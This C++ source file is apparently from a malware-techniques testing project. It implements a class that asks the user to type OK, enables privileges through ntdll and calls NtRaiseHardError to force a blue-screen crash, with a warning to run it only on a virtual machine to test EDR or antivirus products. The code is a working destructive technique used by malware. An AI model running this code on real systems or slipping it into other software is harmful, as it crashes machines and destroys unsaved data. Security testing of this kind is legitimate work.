#include "bsod_thrower.h"
#include "../MalwareTechniques/ntdll.h"

#include <Windows.h>

#include <iostream>

namespace maltech {

    namespace bsod {
        BSODThrower::BSODThrower(ntdll::NtDll& ntdll)
            : ntdll_(ntdll)
        {
        }

        void BSODThrower::TriggerHardError() {
            std::cout << "WARNING!!!\n"
                << "This feature will send a FATAL system error!!!\n"
                << "This will HARD REBOOT your operating system!!!\n"
                << "All unsaved data will be lost!!!\n"
                << "PLEASE use it ONLY on Virtual Machine for testing you EDR or AV system\n"
                << "Type OK for coninue\n"
                << "Type whatever else for distard\n"
                << "Input: ";

            std::string user_input;
            std::cin >> user_input;
            if (user_input != "OK") {
                std::cout << "\nCanceled" << std::endl;
                return;
            }

            BOOLEAN was_enabled;
            ULONG response;

            NTSTATUS status = ntdll_.RtlAdjustPrivilege(SE_TCB_PRIVILEGE, TRUE, FALSE, &was_enabled);
            if (status != STATUS_PRIVILEGE_NOT_HELD) {
                std::cout << "TCB privilege adjusted: 0x" << std::hex << status << std::endl;
            }
            ntdll_.RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &was_enabled);

            status = ntdll_.NtRaiseHardError(
                STATUS_SYSTEM_PROCESS_TERMINATED,
                0,
                0,
                NULL,
                6,
                &response
            );
        }

    }

}